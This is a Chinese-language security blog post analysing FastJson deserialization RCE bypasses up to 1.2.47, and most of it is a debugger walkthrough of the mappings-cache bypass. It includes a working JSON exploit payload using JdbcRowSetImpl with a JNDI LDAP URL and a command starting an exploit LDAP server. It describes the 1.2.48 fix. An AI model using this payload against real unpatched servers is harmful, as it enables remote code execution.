> 原文链接: https://www.anquanke.com//post/id/224820 


# FastJson&lt;=1.2.47RCE细枝末节详细分析


                                阅读量   
                                **102775**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t0175552f2250560322.jpg)](https://p2.ssl.qhimg.com/t0175552f2250560322.jpg)



## 0x00 前言

上篇文章学习了FastJson的第一版漏洞，曝出后官方立马做了更新，增加了checkAutoType()函数，并默认关闭autotype，在这之后一段时间内的绕过都与它有关。本文主要关于FastJson&lt;=1.2.47的相关漏洞。



## 0x01 1.2.41-1.2.43的缠绵不休

这三个版本的修复可以说是非常偷懒了，所以才会连续因为一个原因曝出多个问题。

```
//修复前：
if (className.charAt(0) == '[') `{`
    Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader);
    return Array.newInstance(componentType, 0).getClass();
`}`

if (className.startsWith("L") &amp;&amp; className.endsWith(";")) `{`
    String newClassName = className.substring(1, className.length() - 1);
    return loadClass(newClassName, classLoader);
`}`
```

从1.2.41说起。在checkAutotype()函数中，会先检查传入的[@type](https://github.com/type)的值是否是在黑名单里，如果要反序列化的类不在黑名单中，那么才会对其进行反序列化。问题来了，在反序列化前，会经过loadClass()函数进行处理，其中一个处理方法是：在加载类的时候会去掉className前后的L和;。所以，如果我们传入Lcom.sun.rowset.JdbcRowSetImpl;，在经过黑白名单后，在加载类时会去掉前后的L和;，就变成了com.sun.rowset.JdbcRowSetImpl，反序列化了恶意类。

更新了1.2.42，方法是先判断反序列化目标类的类名前后是不是L和;，如果是，那么先去掉L和;，再进行黑白名单校验（偷懒qaq）。关于1.2.42绕过非常简单，只需要双写L和;，就可以在第一步去掉L和;后，与1.2.41相同。

更新也非常随意，在1.2.43中，黑白名单判断前，又增加了一个是否以LL开头的判断，如果以LL开头，那么就直接抛异常，非常随意解决了双写的问题。但是除了L和;，FastJson在加载类的时候，不只对L和;这样的类进行特殊处理，[也对特殊处理了，所以，同样的方式在前面添加[绕过了1.2.43及之前的补丁。

在1.2.44中，黑客们烦不烦，来了个狠的：只要你以[开头或者;结尾，我直接抛一个异常。如此，终于解决了缠绵多个版本的漏洞。



## 0x02 &lt;=1.2.47的双键调用分析

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"></a>漏洞原理

FastJson有一个全局缓存机制：在解析json数据前会先加载相关配置，调用addBaseClassMappings()和loadClass()函数将一些基础类和第三方库存放到mappings中（mappings是ConcurrentMap类，所以我们在一次连接中传入两个键值a和b，具体内容见下文）。<br>
之后在解析时，如果没有开启autotype，会从mappings或deserializers.findClass()函数中获取反序列化的对应类，如果有，则直接返回绕过了黑名单。<br>
本次要利用的是java.lang.Class类，其反序列化处理类MiscCodec类可以将任意类加载到mappings中，实现了目标。

### <a class="reference-link" name="%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"></a>环境搭建

环境：IDEA + JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar

新建maven项目后添加1.2.47版本的fastjson，并创建fastjson1_2_47.java文件

```
package person;
import com.alibaba.fastjson.JSON;
public class fastjson1_2_47 `{`
    public static void main(String[] argv)`{`
        testJdbcRowSetImpl();
    `}`
    public static void testJdbcRowSetImpl()`{`
        String payload = "`{`\"a\":`{`\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"`}`," +
                "\"b\":`{`\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":" +
                "\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":true`}``}``}`";
        JSON.parse(payload);
    `}`

`}`
```

使用JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar搭建ldap服务

```
java -jar .\JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C calc -A 127.0.0.1
```

运行代码，触发poc

[![](https://p1.ssl.qhimg.com/t016e65dcce88b5c00a.png)](https://p1.ssl.qhimg.com/t016e65dcce88b5c00a.png)

### <a class="reference-link" name="%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90"></a>动态分析

首先在JSON.parse(payload);下断点后调试

[![](https://p3.ssl.qhimg.com/t0180b6e7146474257c.png)](https://p3.ssl.qhimg.com/t0180b6e7146474257c.png)

之后单步步入，过程类似于上篇文章中的调用过程，我们直到DefaultJSONParser.java的parseObject()函数

[![](https://p0.ssl.qhimg.com/t0105d76b1c388013cf.png)](https://p0.ssl.qhimg.com/t0105d76b1c388013cf.png)

下面就进入一个for循环获取并处理我们的payload，我们跟进到如图所示位置，从这里开始就和1.2.24的调用不同了。可以看到我们获取了第一段key为a，由于不是[@type](https://github.com/type)属性，我们会跳过这个if（里面有checkAutoType()和deserializer.deserialze()，我们一会就会回来），继续跟进

[![](https://p2.ssl.qhimg.com/t0147c78dc028ced1af.png)](https://p2.ssl.qhimg.com/t0147c78dc028ced1af.png)

我们跟进到这里，开始处理a内`{`里面的内容

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t013a61a5c148d8515b.png)

接下来调用this.parseObject()，正式进入嵌套，获取处理key为a的内部内容，单步步入后，我们发现又进入了上面进入过的for循环，并且获取的key为[@type](https://github.com/type)，进入上面说的if段

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t016d875ae47cc07d38.png)

[![](https://p4.ssl.qhimg.com/t01235e0fa9c5e94849.png)](https://p4.ssl.qhimg.com/t01235e0fa9c5e94849.png)

调用了checkAutoType()来检查目标类是否符合要求，这里我们不跟进去看了，在分析b段的时候再跟进去。这里我们只要知道，我们利用的java.lang.Class是可以通过校验的就可以了，所以我们单步步过

[![](https://p5.ssl.qhimg.com/t01d7ac85e72ef4c5eb.png)](https://p5.ssl.qhimg.com/t01d7ac85e72ef4c5eb.png)

通过checkAutoType()后获取到clazz为java.lang.Class，之后调用了对应的序列化处理类com.alibaba.fastjson.serializer.MiscCodec()，这里就是核心，我们单步步入

[![](https://p5.ssl.qhimg.com/t011b9d72eb1a96cf24.png)](https://p5.ssl.qhimg.com/t011b9d72eb1a96cf24.png)

可以看到我们进入到MiscCodec.java的deserialze()中，首先调用parser.parse()从payload中获取val对应的键值，也就是JdbcRowSetImpl类，并赋值给strVal，我们继续跟进

[![](https://p0.ssl.qhimg.com/t018d96ca287e1e4dc0.png)](https://p0.ssl.qhimg.com/t018d96ca287e1e4dc0.png)

接下来有一堆if判断，会对我们要反序列化的类进行一个类型的判断，直到如图位置，我们进入TypeUtils.loadClass()函数，这里默认cache为true

[![](https://p5.ssl.qhimg.com/t017bad7ba689cbe9dd.png)](https://p5.ssl.qhimg.com/t017bad7ba689cbe9dd.png)

在TypeUtils.loadClass()中，cache为true时，将键值对应的类名放到mappings中

[![](https://p2.ssl.qhimg.com/t013e6f427830068e2e.png)](https://p2.ssl.qhimg.com/t013e6f427830068e2e.png)

（到目前为止我们已经成功将恶意类com.sun.rowset.JdbcRowSetImpl加载到mappings中，接下来我们继续跟进解析传入的第二个键值b的内容，实现恶意类的jdni注入利用）

在完成loadClass()后会向上层返回，如图，继续跟进后回到for循环正式开始解析键值b的内容，获取到bkey为b后，类似于a那里，会跳过这个if段，在下面再次调用parseObject()来处理b内部内容，我们直接跟进下面的parseObject()

[![](https://p5.ssl.qhimg.com/t010ca58ce294e865e3.png)](https://p5.ssl.qhimg.com/t010ca58ce294e865e3.png)

[![](https://p5.ssl.qhimg.com/t0139a7ef46f31dc327.png)](https://p5.ssl.qhimg.com/t0139a7ef46f31dc327.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0112980d583cf4b8eb.png)

在parseObject()中继续跟进到入checkAutoType()，这次我们进入checkAutoType()看一下

[![](https://p0.ssl.qhimg.com/t01095ba0934608d8d2.png)](https://p0.ssl.qhimg.com/t01095ba0934608d8d2.png)

在checkAutoType内部，没有开启autotype，直接从mappings中获取，然后返回，一气呵成，黑白名单完全没用

[![](https://p3.ssl.qhimg.com/t01fcec6b3c2deb67be.png)](https://p3.ssl.qhimg.com/t01fcec6b3c2deb67be.png)

接下来会调用deserializer.deserialze()和1.2.24一样，造成rce

[![](https://p0.ssl.qhimg.com/t016ab6452f3bd9622c.png)](https://p0.ssl.qhimg.com/t016ab6452f3bd9622c.png)

完整调用链：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0111d531ce8be8e050.png)



## 0x03 总结和修复

本次利用分两步：

第一步利用java.lang.Class将恶意类加载到mappings中；

第二步从mappings中取出恶意类并绕过黑名单进行了反序列化。

在1.2.48中，首先将java.lang.class类加入黑名单，然后将MiscCodec类中的cache参数默认为false，对于checkAutoType()也调整相关逻辑。尽快升级，据说当年hw一片。



## 0x04 结语

上面首先讲述了1.2.41-1.2.43的愚蠢问题，之后跟踪了&lt;=1.2.47的RCE，相信已经非常清楚了，在之后FastJson又曝出了其他问题，下篇文章继续学习。
